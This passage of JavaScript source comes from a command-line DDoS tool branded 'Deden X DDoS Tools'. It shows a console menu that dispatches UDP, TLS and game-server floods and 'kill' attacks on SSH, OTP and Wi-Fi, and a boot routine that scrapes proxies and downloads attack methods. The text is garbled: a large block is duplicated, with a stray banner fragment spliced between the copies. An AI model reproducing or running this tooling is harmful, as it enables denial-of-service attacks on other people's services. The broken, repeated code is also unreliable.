            console.log(`${i+1}. ${p.target} | ${p.methods} | ${elapsed}/${p.duration}s`)
          })
        }
        sigma()
      },
      
      'logs': () => showLogs(),
      
      'queue': () => {
        console.log(`\n📋 Queue: ${attackQueue.length} attacks waiting`)
        attackQueue.forEach((q, i) => {
          console.log(`${i+1}. ${q.target} | ${q.methods}`)
        })
        sigma()
      },
      
      'kill-ping': () => pod(args),
      
      'kill-ssh': () => killSSH(args),
      
      'kill-otp': () => killOTP(args),
      
      'kill-wifi': () => killWifi(),
      
      'udp-raw': () => udp_flood(args),
      
      'xp-pps': () => xp_pps(args),
      
      'mc-flood': () => mcbot(args),
      
      'samp': () => samp(args),
      
      'subdo-finder': () => subdomen(args),
      
      'ai': () => {
        console.log('\n🤖 AI Chat Started (type "exit" to stop)\n')
        chat_ai()
      },
      
      'update': async () => {
        await updateMethods()
        sigma()
      },
      
      'clear': () => {
        clearAll()
        sigma()
      },
      
      'cls': () => {
        banner()
        sigma()
      },
      
      'deden': () => {
        showDedenCredit()
        sigma()
      },
      
      'credits': () => {
        showCredits()
        sigma()
      },
      
      'exit': () => {
        clearAll()
        console.log('\n🕷️  Goodbye! - Deden X DDoS Tools\n')
        console.log('🔥 Credit by: DEDEN, DEFFA, DAVIANT, DAPZY, CIKY 🔥\n')
        process.exit()
      },
      
      '': () => sigma(),
      
      default: () => {
        console.log(`❌ Command '${command}' not found. Type 'help' or 'menu'`)
        sigma()
      }
    }

    const cmd = commands[command] || commands.default
    if (typeof cmd === 'function') cmd()
  })
}

// [========================================] //
// CLEANUP
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) fs.unlinkSync('proxy.txt')
}

function clearUserAgent() {
  if (fs.existsSync('ua.txt')) fs.unlinkSync('ua.txt')
}

function clearall() {
  log('Cleaning up...', 'INFO')
  clearProxy()
  clearUserAgent()
  
  processList.forEach(p => {
    try { process.kill(p.pid) } catch {}
  })
}

// [========================================] //
// PROCESS HANDLERS
// [========================================] //
process.on('exit', clearall)
process.on('SIGINT', () => {
  log('\nReceived SIGINT, cleaning up...', 'WARN')
  clearall()
  console.log('\n🔥 Credit by: DEDEN - Master of DDoS 🔥\n')
  process.exit()
})
process.on('SIGTERM', clearall)
process.on('uncaughtException', (err) => {
  log(`Uncaught Exception: ${err.message}`, 'ERROR')
  log('Continuing...', 'INFO')
})
process.on('unhandledRejection', (err) => {
  log(`Unhandled Rejection: ${err.message}`, 'ERROR')
})

// [========================================] //
// START
// [========================================] //
async function boot() {
  console.log('🕷️  DEDEN X DDOS TOOLS v' + version)
  console.log('🕸️  Loading...')
  console.log('🔥 Credit by: DEDEN, DEFFA, DAVIANT, DAPZY, CIKY 🔥')
  
  await installDependencies()
  await scrapeProxy()
  await scrapeUserAgent()
  
  const commonMethods = ['flood', 'tls', 'bypass', 'raw']
  for (const method of commonMethods) {
    if (!await checkMethodFile(method)) {
      downloadMethod(method)
    }
  }
  
  await sleep(1000)
  await banner()
  
  log('Tools ready! Type "help" for commands', 'SUCCESS')
  log('🔥 Special Credit to: DEDEN - The Mastermind 🔥', 'INFO')
  sigma()
}

boot()8                               ║
║  💬 Status     : Active & Updated                            ║
║                                                               ║
║  ╔══════════════════════════════════════════════════════════╗ ║
║  ║           "Together We Stand, Divided We Fall"           ║ ║
║  ╚══════════════════════════════════════════════════════════╝ ║
║                                                               ║
╚════════════════════════════════════════════════════════════════╝
`)
}

// [========================================] //
// MAIN LOOP
// [========================================] //
async function sigma() {
  permen.question('[\x1b[1m\x1b[32mDeden Console\x1b[0m]: ', (input) => {
    const [command, ...args] = input.trim().split(/\s+/);

    const commands = {
      'help': () => {
        showAllMenu()
        sigma()
      },
      
      'menu': () => {
        showAllMenu()
        sigma()
      },
      
      'methods': () => {
        showMethods()
        sigma()
      },
      
      'attack': () => handleAttackCommand(args),
      
      'track-ip': () => trackIP(args),
      
      'status': () => showStatus(),
      
      'ongoing': () => {
        if (processList.length === 0) {
          console.log('No ongoing attacks')
        } else {
          console.log('\n🕷️  ONGOING ATTACKS:')
          processList.forEach((p, i) => {
            const elapsed = Math.floor((Date.now() - p.startTime) / 1000)
            console.log(`${i+1}. ${p.target} | ${p.methods} | ${elapsed}/${p.duration}s`)
          })
        }
        sigma()
      },
      
      'logs': () => showLogs(),
      
      'queue': () => {
        console.log(`\n📋 Queue: ${attackQueue.length} attacks waiting`)
        attackQueue.forEach((q, i) => {
          console.log(`${i+1}. ${q.target} | ${q.methods}`)
        })
        sigma()
      },
      
      'kill-ping': () => pod(args),
      
      'kill-ssh': () => killSSH(args),
      
      'kill-otp': () => killOTP(args),
      
      'kill-wifi': () => killWifi(),
      
      'udp-raw': () => udp_flood(args),
      
      'xp-pps': () => xp_pps(args),
      
      'mc-flood': () => mcbot(args),
      
      'samp': () => samp(args),
      
      'subdo-finder': () => subdomen(args),
      
      'ai': () => {
        console.log('\n🤖 AI Chat Started (type "exit" to stop)\n')
        chat_ai()
      },
      
      'update': async () => {
        await updateMethods()
        sigma()
      },
      
      'clear': () => {
        clearAll()
        sigma()
      },
      
      'cls': () => {
        banner()
        sigma()
      },
      
      'deden': () => {
        showDedenCredit()
        sigma()
      },
      
      'credits': () => {
        showCredits()
        sigma()
      },
      
      'exit': () => {
        clearAll()
        console.log('\n🕷️  Goodbye! - Deden X DDoS Tools\n')
        console.log('🔥 Credit by: DEDEN, DEFFA, DAVIANT, DAPZY, CIKY 🔥\n')
        process.exit()
      },
      
      '': () => sigma(),
      
      default: () => {
        console.log(`❌ Command '${command}' not found. Type 'help' or 'menu'`)
        sigma()
      }
    }

    const cmd = commands[command] || commands.default
    if (typeof cmd === 'function') cmd()
  })
}

// [========================================] //
// CLEANUP
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) fs.unlinkSync('proxy.txt')
}

function clearUserAgent() {
  if (fs.existsSync('ua.txt')) fs.unlinkSync('ua.txt')
}

function clearall() {
  log('Cleaning up...', 'INFO')
  clearProxy()
  clearUserAgent()
  
  processList.forEach(p => {
    try { process.kill(p.pid) } catch {}
  })
}

// [========================================] //
// PROCESS HANDLERS
// [========================================] //
process.on('exit', clearall)
process.on('SIGINT', () => {
  log('\nReceived SIGINT, cleaning up...', 'WARN')
  clearall()
  console.log('\n🔥 Credit by: DEDEN - Master of DDoS 🔥\n')
  process.exit()
})
process.on('SIGTERM', clearall)
process.on('uncaughtException', (err) => {
  log(`Uncaught Exception: ${err.message}`, 'ERROR')
  log('Continuing...', 'INFO')
})
process.on('unhandledRejection', (err) => {
  log(`Unhandled Rejection: ${err.message}`, 'ERROR')
})

// [========================================] //
// START
// [========================================] //
async function boot() {
  console.log('🕷️  DEDEN X DDOS TOOLS v' + version)
  console.log('🕸️  Loading...')
  console.log('🔥 Credit by: DEDEN, DEFFA, DAVIANT, DAPZY, CIKY 🔥')
  
  await installDependencies()
  await scrapeProxy()
  await scrapeUserAgent()
  
  const commonMethods = ['flood', 'tls', 'bypass', 'raw']
  for (const method of commonMethods) {
    if (!await checkMethodFile(method)) {
      downloadMethod(method)
    }
  }
  
  await sleep(1000)
  await banner()
  
  log('Tools ready! Type "help" for commands', 'SUCCESS')
  log('🔥 Special Credit to: DEDEN - The Mastermind 🔥', 'INFO')
  sigma()
}

boot()
